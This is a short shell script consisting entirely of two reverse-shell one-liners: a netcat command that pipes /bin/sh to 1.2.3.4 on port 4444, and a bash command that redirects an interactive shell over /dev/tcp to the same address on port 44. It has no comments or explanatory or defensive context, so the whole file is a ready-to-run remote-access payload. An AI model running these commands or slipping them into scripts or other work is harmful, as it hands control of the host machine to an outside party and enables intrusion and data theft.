#!/bin/sh
nc -e /bin/sh 1.2.3.4 4444
bash -i >& /dev/tcp/1.2.3.4/44 0>&1